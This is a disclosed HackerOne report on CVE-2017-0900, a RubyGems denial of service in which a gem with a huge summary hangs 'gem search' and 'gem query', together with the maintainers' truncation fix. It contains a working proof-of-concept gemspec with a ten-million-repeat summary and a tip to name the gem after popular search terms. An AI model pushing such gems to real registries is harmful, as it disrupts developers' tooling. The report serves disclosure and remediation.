---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - vuln/code-injection
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2017-08-31
submitted: 2017-06-25T07:53:33.914Z
bounty_usd: null
votes: 5
cve: "CVE-2017-0900"
program: "[[programs/rubygems|RubyGems]]"
reporter: "mame"
source: "https://hackerone.com/reports/243003"
title: "No limit of summary length allows Denail of Service"
---
# No limit of summary length allows Denail of Service

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** RubyGems | **Disclosed:** 2017-08-31

- Report: [https://hackerone.com/reports/243003](https://hackerone.com/reports/243003)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2017-0900
- Submitted: 2017-06-25T07:53:33.914Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.

This is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).

## How to attack

1) An attacker creates a gem with huge summary string, and push it to rubygems.org.
2) A victim runs `gem search -d <substring-of-the-name-of-the-gem>`, but it will give no response.

It may be good for the gem name to include a frequently-searched keyword, such as "foo-rails-bar" or "foo-sinatra-bar".

## Proof of concept

1) Prepare the following gemspec.

~~~~
Gem::Specification.new do |spec|
  spec.name     = "huge-summary"
  spec.version  = "0.0.1"
  spec.authors  = ["Yusuke Endoh"]
  spec.email    = ["mame@ruby-lang.org"]
  spec.summary  = "foo" * 10000000
  spec.homepage = "http://example.com/"
  spec.license  = "MIT"
end
~~~~

2) Run the following commands

~~~~
gem build huge-summary.gemspec
gem install huge-summary-0.0.1.gem
~~~~

3) Run the following command.

~~~~
gem query huge-summary -d
~~~~

It will not answer.

## Timeline

- **Report Filed**
- **2017-06-25** @RubyGems: Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.
- **2017-07-03** @segiddins: The bottleneck seems to be in `Gem::Text#format_text`. One option would be to look into speeding that up, the other is to truncate the summary in `Gem::Commands::QueryCommand#spec_summary` to an arbitrary number of characters
- **2017-07-03** @segiddins: Something like the following seems to make querying fast _enough_, given the user needs to have installed the gem in the first place for this DOS to take place:

```diff
diff --git a/lib/rubygems/commands/query_command.rb b/lib/rubygems/commands/query_command.rb
index 0f58490e..7cf65def 100644
--- a/lib/rubygems/commands/query_command.rb
+++ b/lib/rubygems/commands/query_command.rb
@@ -352,7 +352,12 @@ is too hard to use.
   end
 
   def spec_summary entry, spec
-    entry << "\n\n" << format_text(spec.summary, 68, 4)
+    summary = spec.summary
+    if summary.size > 100_000
+      summary = "Truncating the summary for #{spec.full_name} to 100,000 characters:\n" + summary[0, 100_000]
+    end
+
+    entry << "\n\n" << format_text(summary, 68, 4)
   end
 
 end
```
- **Report Resolved**
- **Agreed On Going Public**
- **Cve Id Added**
- **Not Eligible For Bounty**
- **2017-08-31** @mame: I agree to disclose this ticket.  Thank you very much!
- **Manually Disclosed**
- **Changed Scope**
- **Changed Scope**
